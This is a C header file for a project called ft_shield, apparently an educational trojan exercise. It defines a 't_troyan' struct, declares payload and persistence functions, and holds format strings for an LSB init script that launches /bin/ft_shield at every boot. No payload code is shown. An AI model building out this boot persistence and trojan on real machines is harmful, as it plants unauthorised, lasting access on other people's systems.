#ifndef FT_SHIELD_H
# define FT_SHIELD_H

# include <string.h>
# include <unistd.h>
# include <stdio.h>
# include <stdbool.h>
# include <stdlib.h>
# include <ctype.h>
# include <sys/socket.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <pwd.h>

# define LSB "### BEGIN INIT INFO%c# Provides:          ft_shield%c# Required-Start:    $remote_fs $syslog%c# Required-Stop:     $remote_fs $syslog%c# Default-Start:     2 3 4 5%c# Default-Stop:      0 1 6%c# Short-Description: Start ft_shield daemon%c### END INIT INFO%c%c"
# define PERSISTENCE "case %c$1%c in%c  start)%c    /bin/ft_shield%c    ;;%c  *)%c    exit 1%c    ;;%cesac%cexit 0"

typedef struct s_troyan
{
    struct passwd   *pwd;
    int             bytes_read;
    char            buffer_exe[1024];
    FILE            *fd;
    FILE            *fd_dest;
    FILE            *fd_init;
} t_troyan;

/*** FUNCTIONS ***/
int main();
int ft_payload(t_troyan *shield);
int ft_persistence(t_troyan *shield);

#endif